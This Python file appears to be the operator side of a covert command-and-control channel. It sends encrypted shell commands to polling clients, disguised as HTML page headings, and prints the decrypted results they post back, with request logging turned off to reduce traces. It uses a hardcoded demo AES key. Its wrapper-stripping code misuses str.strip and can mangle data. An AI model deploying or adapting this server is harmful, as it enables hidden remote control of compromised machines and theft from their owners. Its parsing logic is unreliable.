import pyaes
import base64
from http.server import BaseHTTPRequestHandler, HTTPServer
from sys import argv
KEY = b"This_key_for_demo_purposes_only!"
def encrypt(data):
    aes = pyaes.AESModeOfOperationCTR(KEY)
    ciphertext = aes.encrypt(data.encode('utf-8'))
    return base64.b64encode(ciphertext).decode()
def decrypt(encrypted_data):
    aes = pyaes.AESModeOfOperationCTR(KEY)
    decoded_data = base64.b64decode(encrypted_data)
    return aes.decrypt(decoded_data).decode('utf-8')
command_history = []
class CommandServer(BaseHTTPRequestHandler):
    def _set_headers(self, content_type='text/html'):
        self.send_response(200)
        self.send_header('Content-type', content_type)
        self.end_headers()
    def do_GET(self):
        self._set_headers()
        try:
            command = input('$ ')
        except KeyboardInterrupt:
            self._handle_keyboard_interrupt()
            return
        command_history.append(command)
        encrypted_command = encrypt(command)
        response_content = f"<html><body><h1>{encrypted_command}</h1></body></html>"
        self.wfile.write(response_content.encode('utf-8'))
    def _handle_keyboard_interrupt(self):
        response = input('Quit? (y/n/r/c): ')
        if response.lower() == 'y':
            exit(0)
        elif response.lower() == 'r':
            print('Restarting server...')
        elif response.lower() == 'c':
            self._print_command_history()
        else:
            print('Waiting for reconnection...')
    def _print_command_history(self):
        print('Command history:')
        for cmd in command_history:
            print(cmd)
    def do_POST(self):
        self._set_headers()
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode()
        stripped_data = post_data.strip('<html><body><h1>').strip('</h1></body></html>')
        result = decrypt(stripped_data)
        print(result)
    def log_message(self, format, *args):
        pass
def run_server(port=8880):
    server_address = ('', port)
    httpd = HTTPServer(server_address, CommandServer)
    print(f'Starting HTTP server on port {port}...')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('\nShutting down the server...')
        httpd.server_close()
if __name__ == "__main__":
    port = int(argv[1]) if len(argv) > 1 else 8880
    run_server(port)